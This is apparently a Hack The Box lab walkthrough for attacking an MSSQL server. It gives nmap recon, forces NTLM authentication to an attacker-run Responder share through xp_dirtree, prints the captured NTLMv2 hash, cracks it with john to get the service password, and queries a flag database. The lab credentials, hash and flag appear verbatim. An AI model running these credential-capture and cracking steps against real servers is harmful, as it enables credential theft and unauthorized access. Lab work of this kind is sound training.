

## Attacking SQL Databases

Authenticate to target with username "htbdbuser" and password "MSSQLAccess01!"
What is the password for the "mssqlsvc" user?


```
# Recon
nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 $ip -Pn

# Loging into mssql with provided creds
sqsh -S $ip -U htbdbuser -P "MSSQLAccess01\!" -h

# After testing if impersonation was possible and some other attacks, finally what worked was capturing the hash with a smb share.

# Step 1: launch responder on a terminal
sudo responder -I tun0

# Step 2: trying to connect to the share.
EXEC master..xp_dirtree '\\$ipfrommykali\share\'
go

# Step 3: The hash will appear on the responder server
[SMB] NTLMv2-SSP Client   : 10.129.203.12
[SMB] NTLMv2-SSP Username : WIN-02\mssqlsvc                                             
[SMB] NTLMv2-SSP Hash     : mssqlsvc::WIN-02:e0432629cceab798:1AF965C5E50960BD46269DC84E54EAD9:0101000000000000009A55B6CF26DA01E3A952D68DA031C400000000020008004E00520053004A0001001E00570049004E002D004B0037003300380033004E005300350059003500470004003400570049004E002D004B0037003300380033004E00530035005900350047002E004E00520053004A002E004C004F00430041004C00030014004E00520053004A002E004C004F00430041004C00050014004E00520053004A002E004C004F00430041004C0007000800009A55B6CF26DA01060004000200000008003000300000000000000000000000003000004DBF9F1C0133BC299F4A970F0A562972866300C24A22AD5CEC2CB816A95E73D20A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00310030000000000000000000 

# Step 4: Echo the hash to a file
echo "mssqlsvc::WIN-02:e0432629cceab798:1AF965C5E50960BD46269DC84E54EAD9:0101000000000000009A55B6CF26DA01E3A952D68DA031C400000000020008004E00520053004A0001001E00570049004E002D004B0037003300380033004E005300350059003500470004003400570049004E002D004B0037003300380033004E00530035005900350047002E004E00520053004A002E004C004F00430041004C00030014004E00520053004A002E004C004F00430041004C00050014004E00520053004A002E004C004F00430041004C0007000800009A55B6CF26DA01060004000200000008003000300000000000000000000000003000004DBF9F1C0133BC299F4A970F0A562972866300C24A22AD5CEC2CB816A95E73D20A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00310030000000000000000000" > respon.txt

# Step 5: crack the file
john -w=/usr/share/wordlists/rockyou.txt respon.txt
princess1        (mssqlsvc)    
```



Enumerate the "flagDB" database and submit a flag as your answer.

```
# Login in the domain
sqsh -S $ip -U .\\mssqlsvc -P "princess1" -h

# List databases
SELECT name FROM master.dbo.sysdatabases
go
```

```
master                                                           
tempdb                                                           
model                                                            
msdb                                                             
hmaildb                                                          
flagDB    
```

```
# List tables from database
SELECT table_name FROM flagDB.INFORMATION_SCHEMA.TABLES
go
```


```
tb_flag  
```

```
# See 
SELECT * FROM tb_flag
go
```

```
HTB{!_l0v3_#4$#!n9_4nd_r3$p0nd3r}
```



